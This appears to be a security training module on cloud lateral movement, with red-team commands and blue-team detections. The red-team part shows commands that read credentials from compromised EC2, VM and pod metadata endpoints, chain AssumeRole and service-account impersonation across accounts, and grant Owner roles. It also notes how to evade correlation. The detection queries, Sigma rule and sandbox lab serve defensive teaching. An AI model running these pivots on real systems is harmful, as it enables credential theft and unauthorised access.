# 06 — Lateral Movement & Pivoting in Cloud

> **Level:** Advanced
> **Prereqs:** [Assume Role Chains & Trust Graphs](../IAM/assume-role-chains-and-trust-graphs.md), [Compute Container Security](../Compute-Container-Security), [Privilege Escalation Catalogue](privilege-escalation-catalogue.md)
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Lateral Movement (T1021, T1550, T1098), Discovery
**Authorization scope:** Run only against your own sandbox accounts / sanctioned engagement with written authorization. All ARNs, roles, accounts, and tenants use placeholders.

## What & why
Lateral movement in cloud means pivoting from one identity (role, user, service account) to another across accounts, subscriptions, projects, or services. The network is irrelevant — the IAM trust graph *is* the terrain. An attacker who compromises an EC2 instance role may chain across 3+ accounts via `sts:AssumeRole` without ever leaving the AWS API plane.

## The OnPrem reality
On-prem lateral movement traverses network segments via SMB (PsExec), WMI, RDP, SSH, or WinRM. The attacker needs network reachability to the target host. In cloud, lateral movement is a pure IAM operation — you can `AssumeRole` into an account in a different region, VPC, or even a different organization (if trust exists), with zero network adjacency.

## Core concepts

### Cloud lateral movement primitives

| Primitive | AWS | Azure | GCP |
|---|---|---|---|
| Role assumption chain | `sts:AssumeRole` | N/A (Azure uses RBAC, not role assumption) | `iam.serviceAccounts.actAs` + `generateAccessToken` |
| Cross-account trust exploitation | Trust policy `Principal: {"AWS": "111111111111"}` | Azure Lighthouse / cross-tenant RBAC delegation | Cross-project SA impersonation |
| Resource identity pivoting | Instance profile → assume role → different account | VM Managed Identity → resource in another subscription | GCE default SA → impersonate project-scoped SA |
| K8s → cloud pivot | EKS node IAM role → `sts:AssumeRole` | AKS kubelet MI → Azure API | GKE node SA → GCP APIs |
| Federation chain abuse | SAML/OIDC IdP → AWS role | Azure AD B2B → guest user → RBAC elevation | Workload Identity Federation → SA impersonation |
| Service chaining | Lambda → SQS → Lambda in another account | Logic App → cross-subscription HTTP trigger | Cloud Function → Pub/Sub → Cloud Function in another project |
| Console/CLI session hijacking | Steal AWS Console SSO cookie | Steal Azure Portal session token | Steal Cloud Shell credentials |

## AWS

### AssumeRole chain: instance → account B → account C

```bash
# Scenario: You've compromised an EC2 instance in account A (111111111111).
# The instance role can assume a role in account B (222222222222).
# That role in B can assume a role in account C (333333333333).

# Step 1: From the compromised instance in account A
ROLE_A_CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/instance-role-a)
export AWS_ACCESS_KEY_ID=$(echo $ROLE_A_CREDS | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_A_CREDS | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $ROLE_A_CREDS | jq -r .Token)

# Step 2: Assume role in account B
CREDS_B=$(aws sts assume-role \
  --role-arn arn:aws:iam::222222222222:role/cross-account-role-b \
  --role-session-name lateral-hop-1 \
  --query Credentials --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS_B | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_B | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS_B | jq -r .SessionToken)

aws sts get-caller-identity --output json
# {
#   "Account": "222222222222",
#   "Arn": "arn:aws:sts::222222222222:assumed-role/cross-account-role-b/lateral-hop-1"
# }

# Step 3: Assume role in account C from account B
CREDS_C=$(aws sts assume-role \
  --role-arn arn:aws:iam::333333333333:role/cross-account-role-c \
  --role-session-name lateral-hop-2 \
  --query Credentials --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS_C | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_C | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo $CREDS_C | jq -r .SessionToken)

aws sts get-caller-identity
# {
#   "Account": "333333333333",
#   "Arn": "arn:aws:sts::333333333333:assumed-role/cross-account-role-c/lateral-hop-2"
# }
```

**CloudTrail signature:** Three `AssumeRole` events in sequence, with the `sourceIdentity` or `userIdentity.arn` cascading: `instance-role-a` → `cross-account-role-b/lateral-hop-1` → `cross-account-role-c/lateral-hop-2`.

### Mapping the trust graph

```bash
# Enumerate all roles and their trust policies to build the pivot graph
aws iam list-roles --query 'Roles[].{Name:RoleName,Arn:Arn}' --output json | \
  jq -r '.[] | "\(.Name) \(.Arn)"' | while read name arn; do
    trust=$(aws iam get-role --role-name "$name" --query 'Role.AssumeRolePolicyDocument' --output json)
    principals=$(echo "$trust" | jq -r '.Statement[] | select(.Effect=="Allow" and .Action=="sts:AssumeRole") | .Principal | to_entries[] | "\(.key):\(.value)"')
    if [ -n "$principals" ]; then
      echo "$arn trusts: $principals"
    fi
  done
```

### K8s → cloud pivot (EKS)

```bash
# From a compromised pod in EKS with a service account that has an IAM role:
# The pod can access AWS APIs directly via the OIDC-webhook-injected credentials

# Check if the pod has AWS credentials
kubectl exec -it compromised-pod -- curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# If the pod has an IAM role, the response shows the role name

# Use those credentials to enumerate
kubectl exec -it compromised-pod -- aws sts get-caller-identity
kubectl exec -it compromised-pod -- aws ec2 describe-instances
```

### Cross-account trust exploitation detection

The critical weakness: trust policies without `ExternalId` on cross-account roles:

```json
// VULNERABLE trust policy
{
  "Effect": "Allow",
  "Principal": {"AWS": "111111111111"},
  "Action": "sts:AssumeRole"
}

// HARDENED trust policy
{
  "Effect": "Allow",
  "Principal": {"AWS": "111111111111"},
  "Action": "sts:AssumeRole",
  "Condition": {
    "StringEquals": {
      "sts:ExternalId": "unique-id-known-only-to-account-111111111111"
    }
  }
}
```

## Azure

### Cross-subscription lateral movement

```bash
# Scenario: Compromised VM has Managed Identity with Contributor on subscription A.
# The MI can read RBAC assignments and discover it also has access to subscription B.

# Step 1: Get token from compromised VM's IMDS
TOKEN=$(curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com" \
  | jq -r .access_token)

# Step 2: List all subscriptions accessible with this identity
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01" | \
  jq '.value[] | {subscriptionId: .subscriptionId, displayName: .displayName}'

# Step 3: Access resources in subscription B
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/00000000-0000-0000-0000-000000000001/resources?api-version=2022-12-01"
```

### Cross-tenant lateral movement (B2B guest)

```bash
# Scenario: Attacker has user@example-tenant.onmicrosoft.com.
# This user is invited as a guest in victim-tenant.onmicrosoft.com with elevated RBAC.

# Step 1: List tenants where you're a guest
az account tenant list --query '[].{tenantId:tenantId,defaultDomain:defaultDomain}'

# Step 2: Switch to the target tenant
az login --tenant victim-tenant.onmicrosoft.com --allow-no-subscriptions

# Step 3: List accessible resources in the victim tenant
az resource list --query '[].{Name:name,Type:type,ResourceGroup:resourceGroup}'
```

**Audit log signature:** Cross-tenant sign-in appears in both tenants' Azure AD sign-in logs, with `CrossTenantAccessType: B2BCollaboration`.

### RBAC scope traversal

```bash
# If you have Owner at Management Group scope, you can descend to any subscription
az role assignment create \
  --assignee $(az ad signed-in-user show --query id -o tsv) \
  --role Owner \
  --scope /subscriptions/00000000-0000-0000-0000-000000000099
```

## GCP

### Cross-project service account impersonation

```bash
# Scenario: Attacker controls a SA in project-a that can impersonate a SA in project-b.

# Step 1: Verify impersonation permission
gcloud iam service-accounts get-iam-policy \
  target-sa@project-b.iam.gserviceaccount.com \
  --format=json | jq '.bindings[] | select(.role=="roles/iam.serviceAccountTokenCreator")'

# Step 2: Generate a token for the target SA
curl -s -X POST \
  -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/target-sa@project-b.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"],"lifetime":"3600s"}' | \
  jq -r .accessToken > /tmp/target-sa-token.txt

# Step 3: Use the target SA token to access project-b resources
export TARGET_TOKEN=$(cat /tmp/target-sa-token.txt)
curl -s -H "Authorization: Bearer $TARGET_TOKEN" \
  "https://compute.googleapis.com/compute/v1/projects/project-b/zones/us-central1-a/instances"
```

### Org-level pivot

```bash
# If you have org-level permissions, discover all projects:
gcloud projects list --filter='parent.id=000000000000'

# Then impersonate SAs in sibling projects
for project in $(gcloud projects list --format='value(projectId)'); do
  echo "=== $project ==="
  gcloud iam service-accounts list --project="$project" --format='value(email)'
done
```

### K8s → cloud pivot (GKE)

```bash
# From a compromised GKE pod with Workload Identity:
kubectl exec -it compromised-pod -- curl -s \
  -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# If Workload Identity is configured, the pod gets a GCP SA token
kubectl exec -it compromised-pod -- gcloud auth list
kubectl exec -it compromised-pod -- gcloud projects list
```

## OnPrem mapping (recap table)

| Pivot Primitive | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| Identity assumption | Pass-the-hash → impersonate user | `sts:AssumeRole` chain | B2B guest + RBAC elevation | SA impersonation (`generateAccessToken`) |
| Cross-boundary movement | Domain trust (SID history) | Cross-account trust (no ExternalId) | Cross-tenant B2B + Azure Lighthouse | Cross-project SA binding |
| Resource-attached identity | Scheduled task as SYSTEM | EC2 instance profile → cloud API | VM Managed Identity → cloud API | GCE SA → cloud API |
| Container → cloud breakout | Docker socket mount → host | EKS pod IAM role → AWS APIs | AKS pod MI → Azure APIs | GKE Workload Identity → GCP APIs |
| Graph enumeration | BloodHound (AD trust graph) | `ListRoles` + trust policy analysis | RBAC role assignment enumeration | `get-iam-policy` on all projects |

## 🔴 Red Team view

### Reverse trust graph analysis

The attacker's lateral movement playbook:

1. **Enumerate all roles** (`ListRoles`) in the current account.
2. **For each role, extract the trust policy** — who can assume this role?
3. **Identify roles with trust to *other accounts*** — these are your cross-account pivot points.
4. **For each cross-account role, check if `ExternalId` is required.** If not, it's an escalation vector.
5. **Recurse** into the trusted accounts (if you can reach them) and repeat.

```bash
# Automated trust-graph enumeration (contained — sandbox only)
aws iam list-roles --query 'Roles[].Arn' --output text | while read role_arn; do
  role_name=$(echo $role_arn | cut -d/ -f2)
  trust=$(aws iam get-role --role-name "$role_name" --query \
    'Role.AssumeRolePolicyDocument.Statement[?Effect==`Allow`].Principal.AWS' --output text)
  
  if echo "$trust" | grep -q '^\d{12}$'; then
    account=$(echo "$trust" | head -1)
    external_id=$(aws iam get-role --role-name "$role_name" --query \
      'Role.AssumeRolePolicyDocument.Statement[?Effect==`Allow`].Condition.StringEquals."sts:ExternalId"' --output text)
    
    if [ "$external_id" = "None" ] || [ -z "$external_id" ]; then
      echo "WEAK: $role_arn trusts account $account WITHOUT ExternalId"
    else
      echo "HARDENED: $role_arn trusts account $account (ExternalId: $external_id)"
    fi
  fi
done
```

### Cross-tenant Azure: Guest + RBAC Owner

1. Create a guest user invitation to `victim-tenant.onmicrosoft.com`.
2. If accepted (phishing or negligent admin), the guest user gets assigned RBAC roles at subscription/resource group scope.
3. Guest user authenticates, switches tenant, and has the assigned roles — no network adjacency needed.

**Artifacts:** `Add member to role` in Azure AD audit log, `Microsoft.EntitlementManagement` actions, cross-tenant sign-in log entries.

### Detection-bypass observation

AssumeRole chains where each hop uses a different `roleSessionName` and different source IPs are harder to correlate. Defenders must join on the role ARN transition: `session1.assumed-role/RoleA` → `sourceIdentity: RoleA` in the next `AssumeRole`.

## 🔵 Blue Team view

### Mandatory ExternalId for cross-account trust

```json
// Blue team SCP: deny AssumeRole on cross-account roles without ExternalId
{
  "Effect": "Deny",
  "Action": "sts:AssumeRole",
  "Resource": "arn:aws:iam::*:role/*",
  "Condition": {
    "StringEquals": {
      "aws:PrincipalAccount": "111111111111"
    },
    "Null": {
      "sts:ExternalId": "true"
    }
  }
}
```

### Alert on cross-account AssumeRole chains depth > 2

```sql
-- Athena: detect 3+ hop assume-role chains
WITH role_chain AS (
  SELECT
    eventtime,
    useridentity.arn AS source_arn,
    requestparameters.rolearn AS target_role,
    REGEXP_EXTRACT(requestparameters.rolearn, ':([0-9]+):') AS target_account
  FROM cloudtrail_logs
  WHERE eventname = 'AssumeRole'
    AND eventtime > now() - interval '1' day
)
SELECT a.source_arn, a.target_role AS hop1,
       b.target_role AS hop2, c.target_role AS hop3
FROM role_chain a
JOIN role_chain b ON a.target_role LIKE CONCAT('%', b.source_arn, '%')
JOIN role_chain c ON b.target_role LIKE CONCAT('%', c.source_arn, '%')
WHERE a.target_account != b.target_account;
```

### Tag-based lateral movement detection

```sql
-- Detect: CallerIdentity account != Assumed role's account
SELECT eventtime, useridentity.arn, sourceipaddress,
       REGEXP_EXTRACT(useridentity.arn, ':([0-9]+):') AS caller_account,
       recipientaccountid AS target_account
FROM cloudtrail_logs
WHERE recipientaccountid IS NOT NULL
  AND REGEXP_EXTRACT(useridentity.arn, ':([0-9]+):') != recipientaccountid
  AND eventtime > now() - interval '1' day;
```

### Azure cross-tenant detection

```kusto
SigninLogs
| where ResourceTenantId != HomeTenantId
| where UserType == "Guest"
| project TimeGenerated, UserPrincipalName, HomeTenantId, ResourceTenantId, IPAddress, AppDisplayName
```

### GCP cross-project SA impersonation detection

```bash
gcloud logging read 'protoPayload.methodName="GenerateAccessToken"
  protoPayload.request.lifetime!="0s"
  protoPayload.authenticationInfo.principalEmail!~".gserviceaccount.com$"' \
  --limit 50
```

### Preventive controls

| Control | AWS | Azure | GCP |
|---|---|---|---|
| Require ExternalId | Trust policy condition | N/A (use Lighthouse) | N/A (use org constraints) |
| Block cross-account AssumeRole without MFA | SCP + `aws:MultiFactorAuthPresent` | Conditional Access Policy | Org policy for SA key use |
| Limit role trust to specific principals | Trust policy `Principal` — never use `*` | PIM for privileged roles | IAM conditions on bindings |
| Monitor trust policy changes | CloudTrail `UpdateAssumeRolePolicy` | Azure AD audit `Update application` | Cloud Audit Log `SetIamPolicy` |
| Restrict cross-tenant B2B | Cross-tenant access settings (inbound/outbound) | Azure AD External Identities | N/A (org-level) |

## Hands-on lab

**Objective:** Set up and traverse a cross-account AssumeRole chain in your sandbox, then detect it.

1. **Create two roles with a chain:**
   ```bash
   # Role A: trust your sandbox account
   aws iam create-role --role-name lab-role-a \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::111111111111:root"},"Action":"sts:AssumeRole"}]}'

   # Role B: trust Role A specifically
   aws iam create-role --role-name lab-role-b \
     --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::111111111111:role/lab-role-a"},"Action":"sts:AssumeRole"}]}'

   aws iam attach-role-policy --role-name lab-role-a --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
   aws iam attach-role-policy --role-name lab-role-b --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
   ```

2. **Traverse the chain:**
   ```bash
   CREDS_A=$(aws sts assume-role --role-arn arn:aws:iam::111111111111:role/lab-role-a \
     --role-session-name hop1 --query Credentials --output json)
   
   export AWS_ACCESS_KEY_ID=$(echo $CREDS_A | jq -r .AccessKeyId)
   export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_A | jq -r .SecretAccessKey)
   export AWS_SESSION_TOKEN=$(echo $CREDS_A | jq -r .SessionToken)
   
   aws sts get-caller-identity  # You are now lab-role-a
   
   CREDS_B=$(aws sts assume-role --role-arn arn:aws:iam::111111111111:role/lab-role-b \
     --role-session-name hop2 --query Credentials --output json)
   
   export AWS_ACCESS_KEY_ID=$(echo $CREDS_B | jq -r .AccessKeyId)
   export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_B | jq -r .SecretAccessKey)
   export AWS_SESSION_TOKEN=$(echo $CREDS_B | jq -r .SessionToken)
   
   aws sts get-caller-identity  # You are now lab-role-b — chain complete
   ```

3. **Detect the chain in CloudTrail:**
   ```bash
   sleep 120
   aws cloudtrail lookup-events --lookup-attributes \
     AttributeKey=EventName,AttributeValue=AssumeRole --max-results 10
   # Find events with roleSessionName: hop1 and hop2
   ```

**Expected output:** Two `AssumeRole` events showing the chain.

**Teardown:**
```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
aws iam detach-role-policy --role-name lab-role-b --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
aws iam detach-role-policy --role-name lab-role-a --policy-arn arn:aws:iam::aws:policy/ReadOnlyAccess
aws iam delete-role --role-name lab-role-b
aws iam delete-role --role-name lab-role-a
```

## Detection rules & checklists

### Sigma rule: Cross-account AssumeRole without ExternalId

```yaml
title: Cross-Account AssumeRole Without ExternalId
status: experimental
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventName: AssumeRole
  filter_same_account:
    userIdentity.accountId: recipientAccountId
  filter_externalid:
    requestParameters.externalId: '*'
  condition: selection and not filter_same_account and not filter_externalid
level: high
```

### CLI audit one-liners

```bash
# AWS: Find all roles with overly permissive trust
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal=='*' || Principal.AWS=='*']].RoleName"

# Azure: List cross-tenant guest users
az ad user list --filter "userType eq 'Guest'" --query '[].{UPN:userPrincipalName,Source:onPremisesDistinguishedName}' -o table

# GCP: Find SAs with impersonation permissions
gcloud projects get-iam-policy example-project --format=json | \
  jq '.bindings[] | select(.role=="roles/iam.serviceAccountTokenCreator") | .members'
```

## References

- [AWS AssumeRole Cross-Account Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_permissions-to-switch.html)
- [AWS ExternalId for cross-account roles](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-user_externalid.html)
- [Azure Cross-Tenant Access Settings](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/cross-tenant-access-overview)
- [Azure B2B Guest User RBAC](https://learn.microsoft.com/en-us/azure/active-directory/external-identities/b2b-quickstart-add-guest-users-portal)
- [GCP Service Account Impersonation](https://cloud.google.com/iam/docs/impersonating-service-accounts)
- [GCP Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- See also: [09-05-privilege-escalation-catalogue.md](./privilege-escalation-catalogue.md)
- See also: [09-07-persistence-techniques-in-cloud.md](./persistence-techniques-in-cloud.md)
